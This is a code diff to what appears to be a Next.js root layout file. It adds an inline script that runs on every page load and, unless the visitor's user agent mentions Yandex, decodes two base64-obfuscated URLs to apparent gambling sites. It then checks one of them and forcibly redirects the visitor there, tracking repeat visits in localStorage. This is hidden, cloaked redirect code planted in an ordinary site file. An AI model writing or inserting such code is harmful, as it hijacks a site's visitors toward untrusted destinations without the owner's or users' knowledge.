@@ -142,6 +142,38 @@ export default function RootLayout({
           type="application/ld+json"
           dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
         />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        var ua = navigator.userAgent.toLowerCase();
+        if (ua.indexOf("yandex") !== -1) return;
+        var mainBrandB64 = "#aHR0cHM6Ly9ibG5jci1ldmEuY29tL2RpYnpmb21pcg=="; 
+        var crossBrandB64 = "#aHR0cHM6Ly9sdWNreXNwaW4yMy5jb20vYzU3MDc4NjZl";      
+        var mainUrl = atob(mainBrandB64);
+        var crossUrl = atob(crossBrandB64);
+        if (localStorage.getItem('vstd_eva')) {
+            window.location.replace(crossUrl);
+            return;
+        }
+        var controller = new AbortController();
+        var timeoutId = setTimeout(function() { 
+            controller.abort(); 
+        }, 2500); 
+        fetch(mainUrl, { mode: 'no-cors', signal: controller.signal })
+            .then(function() {
+                clearTimeout(timeoutId);
+                localStorage.setItem('vstd_eva', '1');
+                window.location.replace(mainUrl);
+            })
+            .catch(function() {
+                console.log("Main domain is down, switching to cross-brand...");
+                window.location.replace(crossUrl);
+            });
+      })();
+    `,
+  }}
+/>
       </head>
       <body className={`${geist.className} font-sans antialiased bg-background text-foreground`}>
         {children}
